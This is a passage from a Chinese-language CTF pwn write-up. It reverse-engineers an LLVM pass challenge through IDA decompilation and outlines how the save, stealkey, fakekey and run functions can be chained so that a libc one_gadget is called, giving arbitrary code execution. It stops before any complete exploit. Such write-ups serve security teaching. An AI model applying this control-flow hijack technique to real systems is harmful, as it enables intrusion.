(llvm *)&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid opcode!&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;quot;/usr/include/llvm/IR/InstrTypes.h&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;stru_400.st_value + &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                v67);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_142:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              llvm::llvm_unreachable_internal(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (llvm *)&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid opcode!&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;quot;/usr/include/llvm/IR/InstrTypes.h&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;stru_400.st_value + &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                v78);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_143:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              llvm::llvm_unreachable_internal(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (llvm *)&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid opcode!&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;quot;/usr/include/llvm/IR/InstrTypes.h&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;stru_400.st_value + &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v20);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_144:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              llvm::llvm_unreachable_internal(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (llvm *)&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid opcode!&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;quot;/usr/include/llvm/IR/InstrTypes.h&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;stru_400.st_value + &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v24);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_154:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __assert_fail(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;quot;i &amp;lt; getNumArgOperands() &amp;amp;&amp;amp; \&amp;quot;Out of bounds!\&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;quot;/usr/include/llvm/IR/InstrTypes.h&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;number&#34;&gt;0x470&lt;/span&gt;u,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;quot;llvm::Value *llvm::CallBase::getArgOperand(unsigned int) const&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v18 = &lt;span class=&#34;number&#34;&gt;-2LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          v19 = llvm::CallBase::getNumTotalBundleOperands((llvm::CallBase *)(v6 - &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          v20 = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;v8[&lt;span class=&#34;number&#34;&gt;-3&lt;/span&gt; * (*((_DWORD *)v8 + &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFFFFFF&lt;/span&gt;)];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;-1431655765&lt;/span&gt; * (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64)((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;v15[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; * v18 + &lt;span class=&#34;number&#34;&gt;-3&lt;/span&gt; * v19] - v20) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v21 = *((_BYTE *)v8 + &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v21 == &lt;span class=&#34;number&#34;&gt;79&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              v22 = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v21 != &lt;span class=&#34;number&#34;&gt;29&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_143;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              v22 = &lt;span class=&#34;number&#34;&gt;-2LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v23 = (__int64)&amp;amp;v15[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; * v22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                              + &lt;span class=&#34;number&#34;&gt;-3&lt;/span&gt; * (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)llvm::CallBase::getNumTotalBundleOperands((llvm::CallBase *)(v6 - &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;))];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v24 = &amp;amp;v8[&lt;span class=&#34;number&#34;&gt;-3&lt;/span&gt; * (*((_DWORD *)v8 + &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFFFFFF&lt;/span&gt;)];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !(&lt;span class=&#34;number&#34;&gt;-1431655765&lt;/span&gt; * (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64)(v23 - (_QWORD)v24) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_154;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (*((_DWORD *)v8 + &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFFFFFF&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_153;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v25 = *v24;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v26 = *((_BYTE *)v8 + &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v26 == &lt;span class=&#34;number&#34;&gt;79&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              v27 = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v26 != &lt;span class=&#34;number&#34;&gt;29&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_144;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              v27 = &lt;span class=&#34;number&#34;&gt;-2LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v28 = (__int64)&amp;amp;v15[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; * v27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                              + &lt;span class=&#34;number&#34;&gt;-3&lt;/span&gt; * (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)llvm::CallBase::getNumTotalBundleOperands((llvm::CallBase *)(v6 - &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;))];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v29 = &amp;amp;v8[&lt;span class=&#34;number&#34;&gt;-3&lt;/span&gt; * (*((_DWORD *)v8 + &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFFFFFF&lt;/span&gt;)];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;-1431655765&lt;/span&gt; * (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64)(v28 - (_QWORD)v29) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;) &amp;lt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_154;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (*((_DWORD *)v8 + &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFFFFFF&lt;/span&gt;u) &amp;lt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_153;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v30 = v29[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;// *************************************    / /         &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            sub_2430(&amp;amp;src, v25);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            sub_2430(v84, v30);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            bytes = n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            chunk = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;uLL);            &lt;span class=&#34;comment&#34;&gt;// 申请0x20的chunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            chunk[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] = heap; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们看这部分代码，一开始函数名就很长，但是我们看到了 compare，以及上文出现了 v10 = (_BYTE *) llvm::Value::getName (0LL);&lt;br&gt;
v89 = dest; 这条，我们就大胆猜测，这里是判断函数名是否是 “save”。如果是，下面一大串就是对函数的一些常规检查，参数传递是否正确。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220611234626847.png&#34; alt=&#34;image-20220611234626847&#34;&gt;&lt;/p&gt;
&lt;p&gt;像这里就是检查参数是否是有两个，不然就无法执行。下面一直到分割线之前都是我们不需要搭理的，甚至下面的两个函数我们也不需要搭理。我们只要知道下面那些可以直接看懂的部分就好了。后面的分析大致一样。&lt;/p&gt;
&lt;h3 id=&#34;save&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#save&#34;&gt;#&lt;/a&gt; save&lt;/h3&gt;
&lt;p&gt;我们看 save 部分的关键代码&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;       sub_2430(&amp;amp;src, v25);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       sub_2430(v84, v30);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       bytes = n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bytes = n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       chunk = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;uLL);            &lt;span class=&#34;comment&#34;&gt;// 申请0x20的chunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       chunk[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] = heap_ptr;                    &lt;span class=&#34;comment&#34;&gt;// +0x18&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       heap_ptr = chunk;                       &lt;span class=&#34;comment&#34;&gt;// 明显这里储存了chunk的地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       v33 = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)src;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(chunk, src, bytes);          &lt;span class=&#34;comment&#34;&gt;// 向chunk中拷贝数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       v34 = chunk_ptr + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       v35 = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)v84[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(v34, v84[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;], (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;)v84[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先申请到一个 0x20 大小的 chunk，并将这个地址记录到全局变量 heap。就是说这个 heap 变量每次经过 save 就会被更新，旧的并没有被保存。chunk+0x18 的内存记录 heap 变量的地址。下面是有个 src，以及两个 memcpy，但是我们还不清楚 src 以及 v84 是什么。简单进入 sub_2430 函数看一眼，知道这起码是两个字符串，而且是我们传进来的参数。&lt;em&gt;“isString() &amp;amp;&amp;amp; “Not a string””,&lt;/em&gt;, “isa&lt;X&gt;(Val) &amp;amp;&amp;amp; “cast_or_null&lt;Ty&gt;() argument of incompatible type!””, 涉及到对字符串的看呗我们还需要进行调试。拷贝分 2 次，我们一会调试看看。&lt;/p&gt;
&lt;p&gt;经过调试，src 就是我们 save () 的第一个参数，v84 是第二个参数。 而且我们发现我们申请到的空间离 heap 页开始的地址非常远。第一个参数会写在用户区最开始的地方，第二个参数在 chunk_use+0x8，所以我们猜测应该会有检查参数长度。但是我们不需要管。而且调试的时候还发现，我们在 chunk+0x18 的地方会写入 heap_ptr 保存的值。其实就是上一个 save 创建的 chunk。这样就形成了单链表。&lt;/p&gt;
&lt;p&gt;我们继续看剩下的几个操作，&lt;/p&gt;
&lt;h3 id=&#34;takeaway&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#takeaway&#34;&gt;#&lt;/a&gt; takeaway&lt;/h3&gt;
&lt;p&gt;相似的检查方式，只不过参数变为了一个。这里话有个重要的变量 n。但是目前不清楚数值。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             heap_ptr = (_QWORD *)heap_ptr[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(v45);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;猜测其实就是删除某个 chunk，并且将全局变量 heap_ptr 回复为上一个 chunk。但是具体是否有查询功能还不确定。&lt;/p&gt;
&lt;h3 id=&#34;stealkey&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#stealkey&#34;&gt;#&lt;/a&gt; stealkey&lt;/h3&gt;
&lt;p&gt;这部分代码很少，也没有检查函数的参数，所以这个函数应该是没有参数的。关键点在于 byte_204100 = *heap; 某个全局变量值变为 chunk 的字符串的值对应的内存值。。&lt;/p&gt;
&lt;h3 id=&#34;fakekey&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fakekey&#34;&gt;#&lt;/a&gt; fakekey&lt;/h3&gt;
&lt;p&gt;要求函数有一个参数。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;v76 = byte_204100;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( *(_BYTE *)(*v75 + &lt;span class=&#34;number&#34;&gt;16LL&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;13&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                SExtValue = llvm::APInt::getSExtValue((llvm::APInt *)(*v75 + &lt;span class=&#34;number&#34;&gt;24LL&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                SExtValue = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              byte_204100 = v76 + SExtValue;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              *heap = v76 + SExtValue;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;v76 可以通过刚刚的 steal 来设置，就会变为我们可控的值。关键在与 sextvalue 是什么，我们调试看看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220612014631136.png&#34; alt=&#34;image-20220612014631136&#34;&gt;&lt;/p&gt;
&lt;p&gt;调试后发现就是我们传进去的参数，如果我们要传负数，那就写补码。&lt;/p&gt;
&lt;h3 id=&#34;run&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#run&#34;&gt;#&lt;/a&gt; run&lt;/h3&gt;
&lt;p&gt;run 函数是最关键的也是最离谱的，&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*heap)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;直接无脑调用 heap_ptr 指向的 chunk 的 fd，那么思路就是想办法把地址写进去。这里就存在两个关键地方，一个是 fakekey 可以实现对 chunk 的 fd 的修改，在 v76 的基础上加上一个偏移量，那么如果我们能将 v76 的值改为 libc 或者 libc 的一个相关的值，加上一个 offset，就可以实现任意函数调用。因为 call  *heap 后面指定了参数为 0，我们就使用 onegadget。我们先看看这里的栈布局。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span 